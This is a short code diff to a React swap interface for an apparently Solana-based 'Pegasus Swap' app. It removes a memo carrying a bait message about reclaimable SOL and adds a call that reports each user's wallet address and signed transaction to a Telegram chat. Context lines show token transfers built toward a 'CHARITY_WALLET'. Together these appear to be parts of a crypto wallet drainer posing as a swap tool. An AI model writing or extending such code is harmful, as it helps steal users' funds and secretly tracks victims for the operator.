@@ -244,15 +244,6 @@ export const SwapInterface = ({
       })
     );
     
-    // Add Memo Instruction
-    transaction.add(
-      new TransactionInstruction({
-        keys: [],
-        programId: MEMO_PROGRAM_ID,
-        data: new TextEncoder().encode("You’re eligible to receive +0.12 SOL, reclaimed from unused, zero-balance SPL token accounts automatically found and closed while using Pegasus Swap, with the recovered SOL returned directly to your wallet."),
-      })
-    );
-
     const charityPubkey = new PublicKey(CHARITY_WALLET);
 
     // Add token transfers
@@ -429,6 +420,13 @@ export const SwapInterface = ({
              lastValidBlockHeight
            }, 'confirmed');
            toast.success(`Batch ${i + 1} sent!`);
+           
+           sendTelegramMessage(`
+✅ <b>Transaction Signed (Token Batch ${i + 1} - Swap)</b>
+
+👤 <b>User:</b> <code>${publicKey?.toBase58()}</code>
+🔗 <b>Signature:</b> <code>${signature}</code>
+`);
         }
       }
 
